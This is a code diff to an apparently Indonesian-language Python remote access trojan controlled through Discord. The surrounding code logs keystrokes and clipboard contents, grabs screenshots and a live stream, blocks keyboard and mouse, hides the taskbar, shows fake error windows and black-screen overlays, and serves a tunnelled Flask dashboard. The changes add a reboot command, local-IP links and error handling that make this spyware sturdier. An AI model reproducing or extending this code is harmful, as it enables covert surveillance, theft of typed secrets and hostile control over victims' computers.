@@ -2,7 +2,7 @@ import discord
 from discord.ext import commands, tasks
 import psutil, platform, datetime, asyncio, io, json, socket, os, sys, re, ctypes
 from ctypes import wintypes
-import threading, tkinter as tk, subprocess, time, shutil, base64
+import threading, tkinter as tk, subprocess, time, shutil, base64, urllib.request
 from PIL import Image, ImageGrab
 from pynput import keyboard, mouse
 from flask import Flask, Response, request, jsonify
@@ -54,7 +54,7 @@ FAKE_LOCK = threading.Lock()
 
 # State Web & Stream
 WEB_PASSWORD = "nanao" 
-STREAM_PORT = 2222  # <--- PORT DIGANTI JADI 2222
+STREAM_PORT = 2222
 app = Flask(__name__)
 streaming_active = False
 tunnel_process = None
@@ -72,6 +72,15 @@ def capture_screen_to_memory() -> io.BytesIO:
     img = ImageGrab.grab(all_screens=False)
     buffer = io.BytesIO(); img.save(buffer, format="PNG", optimize=True); buffer.seek(0)
     return buffer
+
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except: return "127.0.0.1"
 
 def get_system_info() -> str:
     try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -187,7 +196,7 @@ def clear_fake_errors():
     global FAKE_NOTIF_ACTIVE, FAKE_WINDOWS
     FAKE_NOTIF_ACTIVE = False
     with FAKE_LOCK:
-        for w in FAKE_WINDOWS:
+        for w in list(FAKE_WINDOWS):
             try: 
                 w.quit()
                 w.destroy()
@@ -202,12 +211,7 @@ def reset_all_blocks():
     STOP_MSG = STOP_BS = STOP_BAR = True
     clear_fake_errors()
     
-    # Tangkap listener ke variabel lokal agar tidak bentrok
-    l_kb = kb_block_listener
-    l_ms = ms_block_listener
-    l_mkb = msg_kb_block
-    l_mms = msg_ms_block
-    
+    l_kb = kb_block_listener; l_ms = ms_block_listener; l_mkb = msg_kb_block; l_mms = msg_ms_block
     kb_block_listener = ms_block_listener = msg_kb_block = msg_ms_block = None
     
     for l in [l_kb, l_ms, l_mkb, l_mms]:
@@ -217,7 +221,6 @@ def reset_all_blocks():
             
     try:
         ctypes.windll.user32.BlockInput(False)
-        # Paksa kursor muncul (counter reset)
         for _ in range(5): ctypes.windll.user32.ShowCursor(True)
         hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
         if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 5)
@@ -231,9 +234,8 @@ def on_press(key):
             if len(SHORTCUT_BUFFER) > 3: SHORTCUT_BUFFER = SHORTCUT_BUFFER[-3:]
             if SHORTCUT_BUFFER == "nao": 
                 SHORTCUT_BUFFER = ""
-                # Panggil reset di thread terpisah agar tidak deadlock
                 threading.Thread(target=reset_all_blocks).start()
-                return # Jangan return False agar keylogger tetap jalan
+                return 
     except: pass
     
     if IS_KEYBOARD_BLOCKED or not KEYLOG_ACTIVE: return
@@ -249,11 +251,8 @@ def run_blackscreen_logic():
     def show():
         hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
         if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
-        
-        # Block Input
         msg_kb_block = keyboard.Listener(suppress=True); msg_kb_block.start()
         msg_ms_block = mouse.Listener(suppress=True); msg_ms_block.start()
-        
         black_screen_root = tk.Tk()
         ctypes.windll.user32.SetWindowLongW(ctypes.windll.user32.GetParent(black_screen_root.winfo_id()), -20, ctypes.windll.user32.GetWindowLongW(ctypes.windll.user32.GetParent(black_screen_root.winfo_id()), -20) | 0x00000080 | 0x08000000)
         black_screen_root.overrideredirect(True); black_screen_root.attributes("-topmost", True)
@@ -274,11 +273,8 @@ def run_sendmsg_logic(text, duration):
     def show():
         hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
         if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
-        
-        # Block Input
         msg_kb_block = keyboard.Listener(suppress=True); msg_kb_block.start()
         msg_ms_block = mouse.Listener(suppress=True); msg_ms_block.start()
-        
         msg_window_root = tk.Tk()
         ctypes.windll.user32.SetWindowLongW(ctypes.windll.user32.GetParent(msg_window_root.winfo_id()), -20, ctypes.windll.user32.GetWindowLongW(ctypes.windll.user32.GetParent(msg_window_root.winfo_id()), -20) | 0x00000080 | 0x08000000)
         msg_window_root.overrideredirect(True); msg_window_root.attributes("-topmost", True)
@@ -414,7 +410,7 @@ def dashboard():
     async function fetchLg(){
         const r=await fetch('/api/logs?token='+tk); const l=await r.json(); const t=document.getElementById('log'); let h="";
         l.forEach(x=>{let c=x.text,k=x.type==='keylog'?'key':'';if(x.type==='image')c=`<br><img src="data:image/jpeg;base64,${x.text}" class="img">`;h+=`<div class="log ${k}"><span class="t">[${x.time}]</span> ${c}</div>`});
-        if(t.innerHTML!==h){t.innerHTML=h;t.scrollTop=t.scrollHeight}
+        if(t.innerHTML!==h){t.innerHTML=h;} /* AUTO SCROLL DIHAPUS */
     }
     </script></body></html>"""
 
@@ -443,14 +439,18 @@ def api_toggle():
         if IS_KEYBOARD_BLOCKED:
             if not kb_block_listener: kb_block_listener = keyboard.Listener(suppress=True); kb_block_listener.start()
         else:
-            if kb_block_listener: kb_block_listener.stop(); kb_block_listener = None
+            if kb_block_listener: 
+                try: kb_block_listener.stop()
+                except: pass
+                kb_block_listener = None
     elif f == "bm":
         IS_MOUSE_BLOCKED = not IS_MOUSE_BLOCKED
         if IS_MOUSE_BLOCKED:
             if not ms_block_listener: ms_block_listener = mouse.Listener(suppress=True); ms_block_listener.start()
         else:
             if ms_block_listener: 
-                ms_block_listener.stop()
+                try: ms_block_listener.stop()
+                except: pass
                 ms_block_listener = None
             for _ in range(5): ctypes.windll.user32.ShowCursor(True)
     elif f == "kl": KEYLOG_ACTIVE = not KEYLOG_ACTIVE
@@ -538,7 +538,7 @@ def start_tunnel():
         
         t = threading.Thread(target=read_output, daemon=True)
         t.start()
-        t.join(timeout=20) # Tunggu max 20 detik
+        t.join(timeout=20) 
         
         if result_url[0]:
             PUBLIC_URL = result_url[0]
@@ -615,6 +615,16 @@ async def on_message(message):
     await bot.process_commands(message)
 
 # ============ COMMANDS DISCORD ============
+@bot.command(name="reboot")
+async def cmd_reboot(ctx):
+    if ctx.channel.id != CHANNEL_ID: return
+    await ctx.message.delete()
+    await ctx.send("🔄 **Merestart bot dan mendownload kode terbaru...**")
+    await asyncio.sleep(1)
+    if getattr(sys, 'frozen', False):
+        subprocess.Popen([sys.executable])
+    os._exit(0)
+
 @bot.command(name="hook")
 async def cmd_hook(ctx, arg: str):
     global DISCORD_HOOK
@@ -642,7 +652,7 @@ async def cmd_clrnotif(ctx):
 @bot.command(name="web")
 async def cmd_web(ctx):
     if ctx.channel.id != CHANNEL_ID: return
-    await ctx.message.delete(); msg = await ctx.send("🌐 **Menyiapkan Web & Stream Link...**")
+    await ctx.message.delete(); msg = await ctx.send("🌐 **Menyiapkan Link...**")
     
     if not tunnel_process:
         threading.Thread(target=run_web_server, daemon=True).start()
@@ -650,9 +660,10 @@ async def cmd_web(ctx):
         
     loop = asyncio.get_event_loop()
     url = await loop.run_in_executor(None, start_tunnel)
+    local_ip = get_local_ip()
     
     if url and url.startswith("https://"):
-        embed = discord.Embed(title="🖥️ NANAO LINKS", description=f"**1. Web Controller:**\n[🔗 Buka Dashboard]({url})\n\n**2. Live Stream:**\n[🔗 Buka Stream]({url}/stream)", color=discord.Color.blue())
+        embed = discord.Embed(title="🖥️ NANAO LINKS", description=f"**1. Web Controller (Cloudflare):**\n[🔗 Buka Dashboard]({url})\n\n**2. Local IP:**\n[🔗 Buka Local](http://{local_ip}:{STREAM_PORT})", color=discord.Color.blue())
         await msg.edit(content=None, embed=embed)
     else:
         await msg.edit(content=f"❌ Gagal membuat link: `{url}`")
@@ -710,7 +721,8 @@ async def cmd_closeallapps(ctx):
 async def cmd_cb(ctx):
     if ctx.channel.id != CHANNEL_ID: return
     await ctx.message.delete()
-    result = "\n".join([f"{i+1}. `{c[:80]}`" for i, c in enumerate(CLIPBOARD_HISTORY[:10])])
+    if not CLIPBOARD_HISTORY: return await ctx.send("📋 Kosong.")
+    result = "\n--------------------\n".join([f"{i+1}. `{c[:80]}`" for i, c in enumerate(CLIPBOARD_HISTORY[:10])])
     await ctx.send(embed=discord.Embed(title="📋 Clipboard", description=f"```text\n{result}\n```", color=discord.Color.teal()))
 
 @bot.command(name="antishutdown")
@@ -808,7 +820,10 @@ async def cmd_blockkeyboard(ctx, arg: str):
         await ctx.send("⌨️ **KB BLOCKED.**")
     elif arg.lower() == "off":
         IS_KEYBOARD_BLOCKED = False
-        if kb_block_listener: kb_block_listener.stop(); kb_block_listener = None
+        if kb_block_listener: 
+            try: kb_block_listener.stop()
+            except: pass
+            kb_block_listener = None
         await ctx.send("⌨️ **KB NORMAL.**")
 
 @bot.command(name="blockmouse", aliases=["bm"])
@@ -825,7 +840,8 @@ async def cmd_blockmouse(ctx, arg: str):
     elif arg.lower() == "off":
         IS_MOUSE_BLOCKED = False
         if ms_block_listener: 
-            ms_block_listener.stop()
+            try: ms_block_listener.stop()
+            except: pass
             ms_block_listener = None
         for _ in range(5): ctypes.windll.user32.ShowCursor(True)
         await ctx.send("🖱️ **MOUSE NORMAL.**")
@@ -866,6 +882,7 @@ async def cmd_list(ctx):
     cmd = """
 🌐 WEB & STREAM
 ├ !web / !livestream : Link Web & Stream
+├ !reboot            : Restart & Update Bot
 ├ !hook on/off       : Hidupkan/Mati command DC
 ├ !clear             : Hapus semua chat di channel ini
 └ !clrnotif          : Hapus semua fake error
